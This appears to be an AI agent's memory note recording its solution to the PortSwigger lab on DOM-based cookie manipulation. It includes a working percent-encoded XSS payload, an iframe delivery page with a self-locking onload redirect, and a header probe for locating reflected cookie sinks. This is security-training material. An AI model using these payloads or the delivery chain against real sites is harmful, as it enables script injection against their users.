---
metadata:
  node_type: memory
name: "PortSwigger DOM-based cookie manipulation lab"
description: "DOM cookie-manipulation lab: source window.location→cookie (unencoded), sink home-page server-side `<a href='VALUE'>` with URL-decode — payload must be percent-encoded because Chrome encodes ' < >"
last_updated: 2026-10-10T05:39:39+08:00
created: 2026-10-10T05:39:39+08:00
---

### 2026 lab-dom-cookie-manipulation (arm A, solved)

- 实例: `https://0a6f009704be906281938b1d0005006a.web-security-academy.net`,exploit server `https://exploit-0a050094042490d781238a0c01f600ec.exploit-server.net`。`range_launch launch-url` 直接起实例(路径 canonical,`page_read` 只用于取 widget-lab-id)。
- Source(DOM): 商品页内联脚本 `document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'` — 不做编码,整条 location(含 query)落进 cookie。
- Sink(跨页): 首页**服务端**读该 cookie,渲染 `<a href='VALUE'>Last viewed product</a>`(单引号属性),并对 cookie 值做 URL 解码。实测 `cookie=AA%27%3E%3Cb%3EBB` → `href='AA'><b>BB'>`。
- 反直觉点(本题唯一坑): Chrome 的 URL 解析把 `'` `<` `>` 百分号编码为 `%27 %3E %3C`,所以 cookie 里存的是**编码串**;解码发生在反射点(服务端)。因此 payload 写成百分号编码形反而天然可用,不需要绕过编码——这也是"注入 cookie 让另一页 XSS"的落地方式。
- Payload:`/product?productId=1&%27%3E%3Cscript%3Eprint()%3C/script%3E`。
- Delivery(exploit server body,`&` 写 `&amp;`):
  `<iframe src="https://LAB/product?productId=1&amp;%27%3E%3Cscript%3Eprint()%3C/script%3E" onload="if(!window.x){window.x=1;this.src='https://LAB/'}"></iframe>`
  iframe onload 必须自锁守卫,否则导航到首页后再次 onload 造成无限循环。
- 验证顺序: 先在浏览器里把 payload 换成 `window.__x=1` 探针,`goto product(poison)→goto /→eval window.__x` 得 `1` 再上真 payload;最后 `DELIVER_TO_VICTIM` 必须 `--follow` 且重发 `responseHead`+`responseBody`(只用 responseFile 会 400)。
- 证据: `banner_verdict` `solved=true`,`congrats_line: <h4>Congratulations, you solved the lab!</h4>`。
- 工具坑: `http_session`/`page_read` 会剥离 `<script>` 块,`script_blocks_stripped>0` 时看不到内联脚本 —— 读 DOM 脚本走 `browser_suite goto + eval`(`[...document.querySelectorAll('script')].map(s=>s.src||s.textContent)`)。
- 等价注入面确认法: 对可疑页手工发 `Cookie: <name>=AA%27%3EZZ`,看反射是否解码 + 属性引号类型,一次请求即可定位 sink。

